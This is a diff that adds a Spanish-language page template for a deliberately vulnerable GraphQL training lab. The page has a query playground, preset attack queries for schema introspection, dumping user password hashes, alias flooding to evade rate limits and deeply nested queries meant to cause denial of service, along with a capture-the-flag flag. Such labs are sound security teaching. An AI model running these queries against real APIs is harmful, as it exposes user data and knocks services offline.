@@ -1,0 +1,62 @@
+{% extends "base.html" %}
+{% block title %}GraphQL Advanced Attacks — HackLabs{% endblock %}
+{% block content %}
+<div class="max-w-4xl mx-auto px-4 py-8">
+  <div class="mb-8">
+    <h1 class="text-3xl font-bold text-red-400 mb-2">API8:2023 – GraphQL Advanced (Introspection + Deep Nested)</h1>
+    <p class="text-gray-400">OWASP API Security Top 10 · Riesgo: <span class="text-red-500 font-bold">CRITICAL</span></p>
+  </div>
+
+  <div class="bg-gray-800 rounded-lg p-6 mb-6">
+    <h2 class="text-xl font-bold text-white mb-4">Descripción</h2>
+    <p class="text-gray-300 mb-4">GraphQL introspection habilitada expone todo el esquema. Deep nested queries agotan recursos del servidor (DoS). Alias flooding evita rate limits.</p>
+  </div>
+
+  <div class="bg-gray-800 rounded-lg p-6 mb-6">
+    <h2 class="text-xl font-bold text-white mb-4">GraphQL Playground</h2>
+    <p class="text-gray-400 mb-4">Ejecuta queries contra la API GraphQL:</p>
+    <form id="gqlForm" class="space-y-4">
+      <div>
+        <label class="block text-gray-300 mb-2">Query:</label>
+        <textarea id="query" rows="6" class="w-full bg-gray-700 text-white rounded px-4 py-2 border border-gray-600 focus:border-red-500 focus:outline-none font-mono text-sm"
+placeholder='{ __schema { types { name fields { name } } } }'></textarea>
+      </div>
+      <button type="submit" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded transition">Execute Query</button>
+    </form>
+    <div id="result" class="mt-4 hidden"><pre id="output" class="bg-gray-700 rounded p-4 text-gray-300 text-sm overflow-x-auto"></pre></div>
+  </div>
+
+  <div class="bg-gray-800 rounded-lg p-6 mb-6">
+    <h2 class="text-xl font-bold text-white mb-4">Quick Queries</h2>
+    <div class="space-y-2">
+      <button onclick="runQuery('{ __schema { types { name } } }')" class="w-full text-left bg-gray-700 hover:bg-gray-600 text-gray-300 rounded px-4 py-2 font-mono text-sm">Introspection: Full Schema</button>
+      <button onclick="runQuery('{ users { id name email role password_hash } }')" class="w-full text-left bg-gray-700 hover:bg-gray-600 text-gray-300 rounded px-4 py-2 font-mono text-sm">Query: All Users (with secrets)</button>
+      <button onclick="runQuery('{ a1: user(id:1) { __typename } a2: user(id:1) { __typename } a3: user(id:1) { __typename } }')" class="w-full text-left bg-gray-700 hover:bg-gray-600 text-gray-300 rounded px-4 py-2 font-mono text-sm">Alias Flooding (bypass rate limit)</button>
+      <button onclick="runQuery('{ users { posts { comments { author { posts { comments { author { name } } } } } } } }')" class="w-full text-left bg-gray-700 hover:bg-gray-600 text-gray-300 rounded px-4 py-2 font-mono text-sm">Deep Nested Query (DoS)</button>
+    </div>
+  </div>
+
+  <div class="bg-gray-800 rounded-lg p-6">
+    <h2 class="text-xl font-bold text-white mb-4">🎯 Objetivo</h2>
+    <ol class="list-decimal list-inside text-gray-300 space-y-2">
+      <li>Usa introspection para descubrir el esquema completo</li>
+      <li>Exfiltra datos sensibles via queries normales</li>
+      <li>Alias flooding para evadir rate limiting</li>
+      <li>Deep nested query para causar DoS</li>
+    </ol>
+    <div class="mt-4 p-4 bg-gray-700 rounded"><p class="text-yellow-400 font-mono">Flag: HL{gr4phql_1ntr0sp3ct10n_d33p_n3st3d}</p></div>
+  </div>
+</div>
+<script>
+async function runQuery(q) {
+  const res = await fetch('/graphql/advanced', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({query: q}) });
+  const data = await res.json();
+  document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+  document.getElementById('result').classList.remove('hidden');
+}
+document.getElementById('gqlForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  runQuery(document.getElementById('query').value);
+});
+</script>
+{% endblock %}
